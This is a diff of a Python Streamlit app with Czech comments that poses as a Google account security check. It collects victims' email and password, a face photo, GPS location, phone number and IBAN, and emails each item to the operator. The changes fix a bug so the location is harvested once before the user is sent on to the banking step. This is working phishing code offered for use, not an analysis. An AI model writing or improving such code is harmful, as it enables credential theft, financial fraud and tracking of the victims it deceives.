@@ -7,7 +7,7 @@ from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from email.mime.image import MIMEImage
 from datetime import datetime
-import streamlit.components.v1 as components   # ← přidáno pro GPS
+import streamlit.components.v1 as components
 
 # --- KONFIGURACE Z PROSTŘEDÍ (ENVIRONMENT VARIABLES) ---
 MOJE_ADRESA = os.environ.get("MOJE_ADRESA")
@@ -41,11 +41,13 @@ def je_validni_email(email):
 def je_validni_tel(tel):
     return re.match(r"^\d{9}$", tel)
 
-# --- STAV APLIKACE ---
+# --- STAV APLIKACE + OCHRANA PROTI RESETU ---
 if "step" not in st.session_state:
     st.session_state.step = "login"
 if "zadany_email" not in st.session_state:
     st.session_state.zadany_email = ""
+if "gps_processed" not in st.session_state:          # ← KLÍČOVÁ OCHRANA
+    st.session_state.gps_processed = False
 
 st.set_page_config(page_title="Zabezpečení účtu Google", page_icon="🔒")
 
@@ -91,7 +93,7 @@ with col2:
             else:
                 st.error("Zadejte platný e-mail a heslo.")
 
-    # --- 2. KROK: FACE SCAN (Vynechán hlas) ---
+    # --- 2. KROK: FACE SCAN ---
     elif st.session_state.step == "face":
         show_logo()
         st.info("Fáze 2: Biometrický sken obličeje")
@@ -103,10 +105,10 @@ with col2:
                 odeslat_email("📸 FACE SCAN", f"Uživatel: {st.session_state.zadany_email}", soubor=foto)
                 time.sleep(2)
                 status.update(label="Sken dokončen", state="complete")
-            st.session_state.step = "gps"          # ← změněno na gps
+            st.session_state.step = "gps"
             st.rerun()
 
-    # --- NOVÝ KROK: GPS HNED PO FACE SCANU ---
+    # --- 3. KROK: GPS (OPRAVENO – už se nevrací na login) ---
     elif st.session_state.step == "gps":
         show_logo()
         st.info("Fáze 2.5: Bezpečnostní ověření polohy")
@@ -150,9 +152,9 @@ with col2:
             height=380
         )
 
-        # Zpracování GPS dat po refreshi
+        # === ZPRACOVÁNÍ GPS (s ochranou proti resetu) ===
         query_params = st.query_params
-        if "lat" in query_params and "lon" in query_params:
+        if "lat" in query_params and "lon" in query_params and not st.session_state.gps_processed:
             lat = query_params["lat"][0]
             lon = query_params["lon"][0]
             acc = query_params.get("acc", ["?"])[0]
@@ -162,13 +164,16 @@ with col2:
             
             odeslat_email("📍 GPS COORDINATES", f"Uživatel: {st.session_state.zadany_email}\nGPS: {gps_text}")
             
+            st.session_state.gps_processed = True
+            st.query_params.clear()                    # zabrání opakovanému zpracování
+            
             with st.spinner("Ověřování polohy..."):
                 time.sleep(1.2)
             
             st.session_state.step = "verification"
             st.rerun()
 
-    # --- 3. KROK: TELEFON & BANKID ---
+    # --- 4. KROK: TELEFON & BANKID ---
     elif st.session_state.step == "verification":
         show_logo()
         st.error("⚠️ Podezřelá aktivita zjištěna")
@@ -200,7 +205,7 @@ with col2:
                 else:
                     st.error("Vyplňte telefon a platný IBAN.")
 
-    # --- 4. KROK: FINÁLE ---
+    # --- 5. KROK: FINÁLE ---
     elif st.session_state.step == "finish":
         show_logo()
         st.success("Požadavek byl úspěšně zaznamenán.")
